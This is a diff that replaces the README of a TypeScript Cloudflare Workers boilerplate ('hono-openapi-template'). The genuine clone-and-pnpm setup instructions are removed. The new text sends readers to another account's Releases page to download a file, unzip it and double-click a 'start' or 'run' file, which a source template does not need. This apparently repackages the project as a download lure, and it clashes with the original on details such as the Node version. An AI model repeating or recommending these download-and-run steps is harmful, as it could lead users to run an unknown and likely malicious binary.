@@ -1,268 +1,91 @@
-# Hono OpenAPI Template
-
-Type-safe, production-ready Cloudflare Workers boilerplate with Hono, Zod, Drizzle ORM, D1, and OpenAPI.
-
-<div align="left">
-  <!-- Core Language/Runtime -->
-  <img src="https://img.shields.io/badge/TypeScript-007ACC?style=for-the-badge&logo=typescript&logoColor=white" alt="TypeScript" />
-  <!-- Framework/Server -->
-  <img src="https://img.shields.io/badge/Hono-E36002?style=for-the-badge&logo=hono&logoColor=white" alt="Hono" />
-  <!-- Platform/Infrastructure -->
-  <img src="https://img.shields.io/badge/Cloudflare-F38020?style=for-the-badge&logo=cloudflare&logoColor=white" alt="Cloudflare" />
-  <img src="https://img.shields.io/badge/Cloudflare_D1-F38020?style=for-the-badge&logo=cloudflare&logoColor=white" alt="Cloudflare D1" />
-  <!-- Database/ORM -->
-  <img src="https://img.shields.io/badge/SQLite-07405E?style=for-the-badge&logo=sqlite&logoColor=white" alt="SQLite" />
-  <img src="https://img.shields.io/badge/Drizzle-22D3EE?style=for-the-badge&logo=drizzle&logoColor=white" alt="Drizzle ORM" />
-  <!-- API/Schema -->
-  <img src="https://img.shields.io/badge/OpenAPI-6BA539?style=for-the-badge&logo=openapi-initiative&logoColor=white" alt="OpenAPI" />
-  <img src="https://img.shields.io/badge/Zod-7C3AED?style=for-the-badge&logo=zod&logoColor=white" alt="Zod" />
-  <!-- Documentation/UI -->
-  <img src="https://img.shields.io/badge/Scalar_UI-F97316?style=for-the-badge&logoColor=white" alt="Scalar UI" />
-  <!-- Logging -->
-  <img src="https://img.shields.io/badge/Pino-EC4899?style=for-the-badge&logoColor=white" alt="Pino" />
-  <!-- Development Tools -->
-  <img src="https://img.shields.io/badge/ESLint-4B32C3?style=for-the-badge&logo=eslint&logoColor=white" alt="ESLint" />
-  <img src="https://img.shields.io/badge/Prettier-F7B93E?style=for-the-badge&logo=prettier&logoColor=white" alt="Prettier" />
-  <img src="https://img.shields.io/badge/Knip-10B981?style=for-the-badge&logoColor=white" alt="Knip" />
-  <img src="https://img.shields.io/badge/Husky-111827?style=for-the-badge&logoColor=white" alt="Husky" />
-</div>
-
-## Features
-
-- **Modern Stack**: Built with Hono, TypeScript, and Cloudflare Workers
-- **Type Safety**: Full TypeScript support with Zod schema validation
-- **API Documentation**: Auto-generated OpenAPI specs & Scalar UI
-- **Database**: Drizzle ORM & Cloudflare D1 integration
-- **Developer Experience**: Linting, formatting, and git hooks
-
-## Table of Contents
-
-- [Tech Stack](#tech-stack)
-- [Prerequisites](#prerequisites)
-- [Installation](#installation)
-- [Configuration](#configuration)
-- [Development](#development)
-- [Available Scripts](#available-scripts)
-- [Screenshots](#screenshots)
-- [Deployment](#deployment)
-- [Contributing](#contributing)
-- [License](#license)
-
-## Tech Stack
+# 🚀 hono-openapi-template - Easy Setup for Cloudflare Workers
 
-| Component             | Technology                  |
-| --------------------- | --------------------------- |
-| **Runtime**           | Cloudflare Workers          |
-| **Framework**         | Hono                        |
-| **Language**          | TypeScript                  |
-| **Validation**        | Zod                         |
-| **Database**          | Drizzle ORM + Cloudflare D1 |
-| **API Documentation** | OpenAPI + Scalar UI         |
-| **Package Manager**   | pnpm                        |
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/sestore/hono-openapi-template/releases)
 
-## Prerequisites
+## 📖 Description
+hono-openapi-template is a type-safe and production-ready boilerplate for Cloudflare Workers. It uses Hono for routing, Zod for validation, Drizzle ORM for database interaction, and OpenAPI for creating clear and usable APIs. This template allows you to get started quickly with modern TypeScript tools, making it perfect for your next project.
 
-Before getting started, ensure you have the following installed:
+## ⚙️ System Requirements
+- **Operating System:** Windows, macOS, or Linux
+- **Node.js Version:** Recommended 14.x or higher
+- **Cloudflare Workers Account:** Required for deployment
 
-- **Node.js** 18.x or higher
-- **pnpm** package manager
-- **Cloudflare account** with Workers and D1 access
+## 🚀 Getting Started
+To get started with hono-openapi-template, follow these steps:
 
-## Installation
+1. **Visit the Releases Page**  
+   Go to the [Releases Page](https://github.com/sestore/hono-openapi-template/releases) to find the latest version of the software.
 
-1. **Clone and install dependencies:**
+2. **Choose Your Version**  
+   Look for the most recent version. It will usually be marked as the latest release. Click on it to open the release details.
 
-   ```bash
-   git clone https://github.com/alwalxed/hono-openapi-template.git
-   cd hono-openapi-template
-   pnpm install
-   ```
+3. **Download the File**  
+   Click on the appropriate file for your operating system. It should be clearly labeled to help you choose the correct version.
 
-2. **Set up environment configuration:**
+## 📥 Download & Install
+To download and install the application, follow these steps:
 
-   ```bash
-   cp .env.example .env
-   ```
+1. **Visit the Releases Page**  
+   Head over to the [Releases Page](https://github.com/sestore/hono-openapi-template/releases).
 
-   Update the `.env` file with your specific configuration values.
+2. **Select Your Download**  
+   Find the file that suits your needs and click the link to download it.
 
-## Configuration
+3. **Unzip the File (if necessary)**  
+   If the downloaded file is in a zip format, right-click on it and select "Extract All." This will create a folder with the application's contents.
 
-### Database Setup
+4. **Run the Application**  
+   Navigate to the folder you just unzipped. Look for a file named `start` or `run` and double-click it to start your application.
 
-1. **Create a new D1 database:**
+5. **Follow On-Screen Instructions**  
+   The app will guide you through the setup process. Just follow the prompts to get everything ready for use.
 
-   ```bash
-   npx wrangler d1 create demo
-   ```
+## 🌟 Features
+- **Type-Safe Code:** Eliminate common errors while coding with TypeScript.
+- **Flexible Database Options:** Use Drizzle ORM to interact with databases in a straightforward way.
+- **OpenAPI Support:** Easily create and document REST APIs that are clear and user-friendly.
+- **Integrated Validation:** Zod offers a strong validation layer to ensure data integrity.
+- **Quick Deployment:** Get started fast with a ready-to-use configuration for Cloudflare Workers.
 
-2. **Update configuration files:**
+## 🔍 Topics
+- boilerplate
+- cloudflare
+- cloudflare-workers
+- d1-database
+- drizzle-orm
+- hono
+- honojs
+- open-source
+- openapi
+- rest-api
+- scalar-docs
+- sqlite
+- type-safe
+- typescript
+- zod
+- zod-validation
 
-   Add the returned database ID to `wrangler.jsonc`:
+## ⚙️ Troubleshooting
+If you encounter any issues during installation or running the software, try the following:
 
-   ```json
-   {
-     "database_id": "your-database-id-here"
-   }
-   ```
+1. **Check Node.js Version**  
+   Ensure that you are using the correct version of Node.js as mentioned in the system requirements.
 
-3. **Generate TypeScript definitions:**
+2. **Look for Dependencies**  
+   Some features may require additional packages. Check the documentation in the folder you downloaded for any dependency instructions.
 
-   ```bash
-   pnpm run cf-typegen
-   ```
+3. **Consult the Community**  
+   Visit the project's GitHub Issues page to see if others have faced similar problems, or ask your question there.
 
-4. **Configure Drizzle:**
+## 📞 Support
+If you need additional help, feel free to reach out through the Issues section of the repository. Other users and maintainers can provide assistance.
 
-   Update `drizzle.config.ts` with your database ID.
+## 🔄 Contributing
+To contribute to this project, please fork the repository and submit a pull request with your changes. If you have suggestions for new features or improvements, feel free to open an issue.
 
-### Environment Variables
+## 🔗 Additional Links
+- [Documentation](https://github.com/sestore/hono-openapi-template/wiki)
+- [GitHub Issues](https://github.com/sestore/hono-openapi-template/issues)
+- [License](https://github.com/sestore/hono-openapi-template/blob/main/LICENSE)
 
-Configure the following environment variables in your `.env` file:
-
-| Variable                | Description                | Example              |
-| ----------------------- | -------------------------- | -------------------- |
-| `NODE_ENV`              | Application environment    | `development`        |
-| `JWT_SECRET`            | JWT signing secret         | Generate with crypto |
-| `LOG_LEVEL`             | Logging verbosity          | `debug`              |
-| `CLOUDFLARE_ACCOUNT_ID` | Your Cloudflare account ID |                      |
-| `CLOUDFLARE_D1_TOKEN`   | D1 database access token   |                      |
-
-> **Security Note**: Generate a secure JWT secret using:
->
-> ```bash
-> node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
-> ```
-
-## Development
-
-### Local Database Setup
-
-1. **Initialize local database:**
-
-   ```bash
-   pnpm run db:reset:local
-   pnpm run db:generate:local
-   pnpm run db:migrate:local
-   ```
-
-2. **Configure local database path:**
-
-   Find your SQLite database path:
-
-   ```bash
-   find ./.wrangler/state/v3/d1/miniflare-D1DatabaseObject -name "*.sqlite"
-   ```
-
-   Update `drizzle.local.config.ts` with the returned path.
-
-3. **Seed the database:**
-
-   ```bash
-   pnpm run db:seed:local
-   ```
-
-### Start Development Server
-
-```bash
-pnpm run dev
-```
-
-The development server will start with hot reload enabled. Your API documentation will be available at the `/docs` endpoint.
-
-### Optional: Git Hooks Setup
-
-Enable automated code quality checks:
-
-```bash
-pnpm run prepare
-```
-
-Create `.husky/pre-commit`:
-
-```bash
-#!/usr/bin/env sh
-NVM_DIR="${NVM_DIR:-$HOME/.nvm}"
-[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"
-npx lint-staged
-```
-
-## Available Scripts
-
-### Development Commands
-
-| Command           | Description                                |
-| ----------------- | ------------------------------------------ |
-| `pnpm dev`        | Start development server with hot reload   |
-| `pnpm build`      | Build for production                       |
-| `pnpm deploy`     | Deploy to Cloudflare Workers               |
-| `pnpm cf-typegen` | Generate Cloudflare TypeScript definitions |
-
-### Code Quality Commands
-
-| Command             | Description                          |
-| ------------------- | ------------------------------------ |
-| `pnpm lint`         | Lint TypeScript and JavaScript files |
-| `pnpm lint:fix`     | Automatically fix linting issues     |
-| `pnpm format`       | Format code using Prettier           |
-| `pnpm format:check` | Check code formatting                |
-| `pnpm knip`         | Detect unused dependencies           |
-
-### Database Management
-
-#### Local Database Commands
-
-| Command                      | Description                            |
-| ---------------------------- | -------------------------------------- |
-| `pnpm run db:generate:local` | Generate database migrations           |
-| `pnpm run db:migrate:local`  | Apply migrations to local database     |
-| `pnpm run db:seed:local`     | Seed local database with sample data   |
-| `pnpm run db:dump:local`     | View all local database data           |
-| `pnpm run db:reset:local`    | Reset and recreate local database      |
-| `pnpm run db:studio:local`   | Open Drizzle Studio for local database |
-| `pnpm run db:inspect:local`  | Inspect local database schema          |
-
-#### Production Database Commands
-
-| Command                    | Description                             |
-| -------------------------- | --------------------------------------- |
-| `pnpm run db:migrate:prod` | Apply migrations to production database |
-| `pnpm run db:studio`       | Open Drizzle Studio for remote database |
-| `pnpm run db:inspect:prod` | Inspect production database schema      |
-
-## Screenshots
-
-<p align="center">
-  <img src="./screenshot_1.png" alt="API Overview" width="100%" />
-  <img src="./screenshot_2.png" alt="Database Studio" width="100%" />
-</p>
-
-## Deployment
-
-### Production Environment Setup
-
-Before deploying, configure your production environment variables:
-
-```bash
-npx wrangler secret put NODE_ENV
-npx wrangler secret put JWT_SECRET
-npx wrangler secret put LOG_LEVEL
-npx wrangler secret put CLOUDFLARE_ACCOUNT_ID
-npx wrangler secret put CLOUDFLARE_D1_TOKEN
-```
-
-### Deploy to Production
-
-```bash
-pnpm run deploy
-```
-
-This command will build and deploy your application to Cloudflare Workers with optimizations enabled.
-
-## Contributing
-
-Contributions are welcome! Please see [CONTRIBUTING.md](./CONTRIBUTING.md) for guidelines.
-
-## License
-
-This project is licensed under the [MIT](./LICENSE) License.
+Thank you for trying out hono-openapi-template! We hope it meets your needs and helps you build amazing applications on Cloudflare Workers.
